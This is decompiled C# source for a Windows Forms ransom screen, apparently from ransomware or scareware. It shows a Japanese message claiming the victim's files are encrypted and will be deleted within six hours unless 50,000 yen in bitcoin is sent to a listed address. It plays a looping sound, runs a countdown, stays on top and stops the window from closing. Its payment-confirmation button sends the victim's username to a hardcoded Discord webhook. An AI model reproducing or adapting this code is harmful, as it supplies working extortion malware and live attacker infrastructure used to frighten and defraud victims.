using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.Net.Http;
using System.Runtime.InteropServices;
using System.Windows.Forms;

public class Form1 : Form
{
	private GInterface6 ginterface6_0 = (GInterface6)Activator.CreateInstance(Marshal.GetTypeFromCLSID(new Guid("6BF52A52-394A-11D3-B153-00C04F79FAA6")));

	private static int int_0 = 21600;

	private IContainer icontainer_0;

	private Label label1;

	private TextBox textBox1;

	private Label label2;

	private Timer timer_0;

	private Label label3;

	private Button button1;

	public Form1()
	{
		InitializeComponent();
		ginterface6_0.GInterface5_0.imethod_0("loop", bool_0: true);
		ginterface6_0.String_0 = "jihou.mp3";
	}

	private void timer_0_Tick(object sender, EventArgs e)
	{
		if (int_0 == 0)
		{
			((Control)label3).set_ForeColor(Color.Red);
			((Control)label3).set_Text("TIME OUT");
			ginterface6_0.GInterface5_0.imethod_0("loop", bool_0: false);
			ginterface6_0.GInterface0_0.imethod_0();
			Console.Beep(5000, 3000);
		}
		else
		{
			((Control)label3).set_Text("残り" + int_0 + "秒");
			int_0--;
		}
	}

	private void Form1_FormClosing(object sender, FormClosingEventArgs e)
	{
		((CancelEventArgs)(object)e).Cancel = true;
	}

	private void button1_Click(object sender, EventArgs e)
	{
		//IL_000d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0013: Invalid comparison between Unknown and I4
		//IL_0015: Unknown result type (might be due to invalid IL or missing references)
		//IL_0046: Unknown result type (might be due to invalid IL or missing references)
		//IL_0050: Expected O, but got Unknown
		//IL_006b: Unknown result type (might be due to invalid IL or missing references)
		if ((int)MessageBox.Show("本当に送金しましたか？着金が確認されない場合、即座にファイルを削除します。", "質問", (MessageBoxButtons)1, (MessageBoxIcon)16) == 1)
		{
			HttpClient val = new HttpClient();
			Dictionary<string, string> dictionary = new Dictionary<string, string>
			{
				{ "content", "------------------------------------\nThe money was sent" },
				{
					"username",
					Environment.UserName
				}
			};
			val.PostAsync("https://discord.com/api/webhooks/867659732009746492/cut3G4XUcqCb9fvlz594HRE4itAl4IViIQ9kOz-LZKLwpqDw_L4vZqTJHqEqVrG1PqiS", (HttpContent)new FormUrlEncodedContent((IEnumerable<KeyValuePair<string, string>>)dictionary)).GetAwaiter().GetResult();
			MessageBox.Show("送金完了の通信をしました。タイマーを一時ストップします。\n注意：タイマーがストップしないバグがあります。表示上の問題ですので心配ありません。", "質問", (MessageBoxButtons)0, (MessageBoxIcon)64);
		}
	}

	void Form.Dispose(bool disposing)
	{
		if (disposing && icontainer_0 != null)
		{
			icontainer_0.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_0033: Unknown result type (might be due to invalid IL or missing references)
		//IL_003d: Expected O, but got Unknown
		//IL_003e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0048: Expected O, but got Unknown
		//IL_0049: Unknown result type (might be due to invalid IL or missing references)
		//IL_0053: Expected O, but got Unknown
		//IL_007c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0086: Expected O, but got Unknown
		//IL_00f6: Unknown result type (might be due to invalid IL or missing references)
		//IL_0100: Expected O, but got Unknown
		//IL_017d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0187: Expected O, but got Unknown
		//IL_023a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0244: Expected O, but got Unknown
		//IL_03fc: Unknown result type (might be due to invalid IL or missing references)
		//IL_0406: Expected O, but got Unknown
		icontainer_0 = new Container();
		label1 = new Label();
		textBox1 = new TextBox();
		label2 = new Label();
		timer_0 = new Timer(icontainer_0);
		label3 = new Label();
		button1 = new Button();
		((Control)this).SuspendLayout();
		((Control)label1).set_AutoSize(true);
		((Control)label1).set_Font(new Font("MS UI Gothic", 20f, (FontStyle)0, (GraphicsUnit)3, (byte)128));
		((Control)label1).set_Location(new Point(8, 12));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(746, 162));
		((Control)label1).set_TabIndex(0);
		((Control)label1).set_Text("こんにちは。\r\nあなたのコンピュータはウイルスに感染してしまいました。\r\nこのコンピュータに保存されているファイルはすべて暗号化され、開けなく\r\nなっています。\r\nそして今から6時間後にファイルは削除され永遠になくなります。\r\n制限時間内に5万円相当のビットコイン(送信時のレートで)を");
		((Control)textBox1).set_Font(new Font("MS UI Gothic", 15f, (FontStyle)0, (GraphicsUnit)3, (byte)128));
		((Control)textBox1).set_Location(new Point(18, 190));
		((Control)textBox1).set_Name("textBox1");
		((Control)textBox1).set_Size(new Size(554, 27));
		((Control)textBox1).set_TabIndex(1);
		((Control)textBox1).set_Text("31wP133eCvBuDqZXTZDw81L5FVW1pTGR3p");
		((Control)label2).set_AutoSize(true);
		((Control)label2).set_Font(new Font("MS UI Gothic", 20f, (FontStyle)0, (GraphicsUnit)3, (byte)128));
		((Control)label2).set_Location(new Point(13, 220));
		((Control)label2).set_Name("label2");
		((Control)label2).set_Size(new Size(614, 189));
		((Control)label2).set_TabIndex(2);
		((Control)label2).set_Text("このアドレスに送ってください。\r\n送金が確認され次第ファイルを復号化します。\r\n\r\n1.再起動しないでください。タイマーの速度が速くなります。\r\n2.ビットコインの買い方はmoonpayが最善です。\r\n3.クレジットカードを持っていない場合Line payの\r\n  プリペイドカードが使えます。");
		timer_0.set_Enabled(true);
		timer_0.set_Interval(1000);
		timer_0.add_Tick((EventHandler)timer_0_Tick);
		((Control)label3).set_AutoSize(true);
		((Control)label3).set_Font(new Font("MS UI Gothic", 15f, (FontStyle)0, (GraphicsUnit)3, (byte)128));
		((Control)label3).set_Location(new Point(582, 344));
		((Control)label3).set_Name("label3");
		((Control)label3).set_Size(new Size(45, 20));
		((Control)label3).set_TabIndex(3);
		((Control)label3).set_Text("time");
		((Control)button1).set_BackColor(Color.White);
		((Control)button1).set_ForeColor(Color.Black);
		((Control)button1).set_Location(new Point(651, 407));
		((Control)button1).set_Name("button1");
		((Control)button1).set_Size(new Size(124, 31));
		((Control)button1).set_TabIndex(4);
		((Control)button1).set_Text("送金しました。");
		((ButtonBase)button1).set_UseVisualStyleBackColor(false);
		((Control)button1).add_Click((EventHandler)button1_Click);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 12f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackColor(SystemColors.ActiveCaptionText);
		((Form)this).set_ClientSize(new Size(800, 450));
		((Control)this).get_Controls().Add((Control)(object)button1);
		((Control)this).get_Controls().Add((Control)(object)label3);
		((Control)this).get_Controls().Add((Control)(object)label2);
		((Control)this).get_Controls().Add((Control)(object)textBox1);
		((Control)this).get_Controls().Add((Control)(object)label1);
		((Control)this).set_ForeColor(Color.Lime);
		((Control)this).set_Name("Form1");
		((Control)this).set_Text("Form1");
		((Form)this).set_TopMost(true);
		((Form)this).add_FormClosing(new FormClosingEventHandler(Form1_FormClosing));
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
